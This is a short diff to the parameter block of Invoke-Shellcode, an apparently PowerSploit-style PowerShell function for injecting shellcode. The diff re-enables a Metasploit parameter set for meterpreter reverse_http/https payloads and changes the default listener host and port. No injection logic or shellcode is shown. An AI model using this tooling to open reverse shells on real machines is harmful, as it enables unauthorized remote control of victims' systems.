@@ -1,3 +1,4 @@
+
 function Invoke-Shellcode
 {
 
@@ -11,12 +12,12 @@ function Invoke-Shellcode
     [Byte[]]
     $Shellcode,
     
- #   [Parameter( ParameterSetName = 'Metasploit' )]
-  #  [ValidateSet( 'windows/meterpreter/reverse_http',
-   #               'windows/meterpreter/reverse_https',
-    #              IgnoreCase = $True )]
+    [Parameter( ParameterSetName = 'Metasploit' )]
+    [ValidateSet( 'windows/meterpreter/reverse_http',
+                  'windows/meterpreter/reverse_https',
+                  IgnoreCase = $True )]
     [String]
-    $Payload = 'windows/meterpreter/reverse_https',
+    $Payload = 'windows/meterpreter/reverse_http',
     
     [Parameter( ParameterSetName = 'ListPayloads' )]
     [Switch]
@@ -26,13 +27,13 @@ function Invoke-Shellcode
                 ParameterSetName = 'Metasploit' )]
     [ValidateNotNullOrEmpty()]
     [String]
-    $Lhost = '192.168.223.135',
+    $Lhost = '127.0.0.1',
     
     [Parameter( Mandatory = $True,
                 ParameterSetName = 'Metasploit' )]
     [ValidateRange( 1,65535 )]
     [Int]
-    $Lport = 4444,
+    $Lport = 8443,
     
     [Parameter( ParameterSetName = 'Metasploit' )]
     [ValidateNotNull()]
@@ -42,4 +43,6 @@ function Invoke-Shellcode
     [Switch]
     $Force = $False
 )
+
+
 }
